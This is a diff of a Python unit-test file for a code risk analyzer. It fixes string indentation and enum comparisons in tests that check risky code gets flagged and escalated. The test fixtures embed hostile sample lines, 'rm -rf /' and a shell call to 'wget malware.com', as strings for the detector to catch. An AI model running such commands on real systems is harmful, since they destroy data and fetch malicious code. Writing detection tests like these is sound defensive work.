@@ -38,18 +38,17 @@ class TestBehaviorConstraints(unittest.TestCase):
         return str(file_path)
 
     def test_context_analysis(self):
-        # Create test file
-        code = """
-        import os
-        import sys
-        
-        def risky_function():
-            os.system("rm -rf /")  # Dangerous!
-            
-        class TestClass:
-            def __init__(self):
-                pass
-        """
+        # Create test file with no indentation
+        code = """import os
+import sys
+
+def risky_function():
+    os.system("rm -rf /")  # Dangerous!
+    
+class TestClass:
+    def __init__(self):
+        pass
+"""
         
         file_path = self.create_test_file(code)
         analyzer = ContextAnalyzer()
@@ -57,7 +56,7 @@ class TestBehaviorConstraints(unittest.TestCase):
         # Test code context
         context = analyzer.analyze_code_context(file_path)
         self.assertEqual(context.context_type, ContextType.CODE_CONTEXT)
-        self.assertGreaterEqual(context.risk_level, RiskLevel.MODERATE)
+        self.assertTrue(context.risk_level.value >= RiskLevel.MODERATE.value)
         
         # Test runtime context
         context = analyzer.analyze_runtime_context()
@@ -202,14 +201,13 @@ class TestBehaviorConstraints(unittest.TestCase):
 
     def test_risk_escalation(self):
         # Create test file with risky content
-        code = """
-        import os
-        import subprocess
-        
-        def dangerous_function():
-            os.system("rm -rf /")
-            subprocess.call("wget malware.com", shell=True)
-        """
+        code = """import os
+import subprocess
+
+def dangerous_function():
+    os.system("rm -rf /")
+    subprocess.call("wget malware.com", shell=True)
+"""
         
         file_path = self.create_test_file(code)
         
@@ -226,10 +224,7 @@ class TestBehaviorConstraints(unittest.TestCase):
             
             # Should eventually escalate to high risk
             if intent:
-                self.assertGreaterEqual(
-                    intent.estimated_risk,
-                    RiskLevel.HIGH
-                )
+                self.assertTrue(intent.estimated_risk.value >= RiskLevel.HIGH.value)
 
 
 if __name__ == '__main__':
